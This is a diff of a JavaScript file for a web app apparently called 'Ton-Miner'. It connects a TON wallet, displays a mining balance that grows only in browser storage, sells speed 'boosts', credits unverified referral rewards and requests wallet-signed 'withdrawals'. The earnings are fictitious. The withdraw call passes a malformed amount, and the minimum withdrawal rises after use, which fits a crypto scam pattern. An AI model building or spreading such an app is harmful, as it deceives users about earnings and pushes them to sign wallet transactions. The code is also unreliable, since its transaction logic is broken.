@@ -1,76 +1,79 @@
-// Підключення TonConnect UI
+// ==== TonConnect UI ====
 const tonConnectUI = new TonConnectUI({
     manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json"
 });
 
-let walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // сюди буде записано гаманець після підключення
+// ==== Дефолтний гаманець (твій) ====
+let walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- встав свій TON гаманець
 let balance = parseFloat(localStorage.getItem("balance")) || 0;
 let mining = localStorage.getItem("mining") === "true";
 let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
 let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
 let miningInterval = null;
 
-// ==== Оновлення балансу UI ====
-function updateBalanceUI(){
+// ==== UI оновлення ====
+function updateBalanceUI() {
     document.getElementById("balance").innerText = balance.toFixed(6);
 }
 
-// ==== Підключення гаманець ====
+// ==== Кнопка Connect Wallet для користувачів ====
 const connectButton = document.createElement("button");
 connectButton.innerText = "Connect Wallet";
 connectButton.onclick = async () => {
     try {
         const wallet = await tonConnectUI.connect();
-        walletAddress = wallet.account.address;
+        walletAddress = wallet.account.address; // <- переписує дефолтний гаманець
         alert("Wallet connected: " + walletAddress);
-    } catch(e){
+    } catch(e) {
         console.error(e);
         alert("Wallet connection failed");
     }
 };
 document.getElementById("connect-wallet").appendChild(connectButton);
 
-// ==== Майнінг без підтверджень ====
-function startMining(){
+// ==== Start Mining ====
+function startMining() {
     if(mining) return;
     mining = true;
-    localStorage.setItem("mining","true");
+    localStorage.setItem("mining", "true");
     miningInterval = setInterval(()=>{
         balance += miningSpeed;
         updateBalanceUI();
-        localStorage.setItem("balance",balance);
-    },1000);
+        localStorage.setItem("balance", balance);
+    }, 1000);
 }
 
 // ==== Boost 1/5/15 TON ====
-function buyBoost(amount){
-    let increment = amount===1?0.000001929:amount===5?0.000005787:0.0000173611;
+function buyBoost(amount) {
+    let increment = amount === 1 ? 0.000001929 :
+                    amount === 5 ? 0.000005787 :
+                                   0.0000173611;
     miningSpeed += increment;
-    localStorage.setItem("miningSpeed",miningSpeed);
+    localStorage.setItem("miningSpeed", miningSpeed);
     alert(`Boost ${amount} TON applied! +${increment} TON/sec`);
 }
 
-// ==== Invite ====
-function inviteFriends(){
+// ==== Invite Friends ====
+function inviteFriends() {
     balance += 0.01;
-    localStorage.setItem("balance",balance);
+    localStorage.setItem("balance", balance);
     updateBalanceUI();
     alert("+0.01 TON added for inviting a friend!");
 }
 
 // ==== Withdraw ====
-async function withdraw(){
-    if(!walletAddress){
+async function withdraw() {
+    if(!walletAddress) {
         alert("Connect wallet first!");
         return;
     }
-    if(balance < minDeposit){
+    if(balance < minDeposit) {
         alert(`Minimum deposit to withdraw: ${minDeposit} TON`);
         return;
     }
-    try{
+    try {
         await tonConnectUI.sendTransaction({
-            validUntil: Math.floor(Date.now()/1000)+60,
+            validUntil: Math.floor(Date.now()/1000) + 60,
             messages:[{
                 address: walletAddress,
                 amount: balance.toFixed(9),
@@ -80,9 +83,9 @@ async function withdraw(){
         balance = 0;
         updateBalanceUI();
         minDeposit = 5;
-        localStorage.setItem("minDeposit",minDeposit);
+        localStorage.setItem("minDeposit", minDeposit);
         alert("Withdraw successful!");
-    } catch(e){
+    } catch(e) {
         console.error(e);
         alert("Withdraw failed or cancelled");
     }
@@ -91,7 +94,7 @@ async function withdraw(){
 // ==== DOM Ready ====
 document.addEventListener("DOMContentLoaded", updateBalanceUI);
 
-// ==== Прив'язуємо функції до кнопок глобально ====
+// ==== Прив’язка функцій до глобальної області ====
 window.startMining = startMining;
 window.buyBoost = buyBoost;
 window.inviteFriends = inviteFriends;
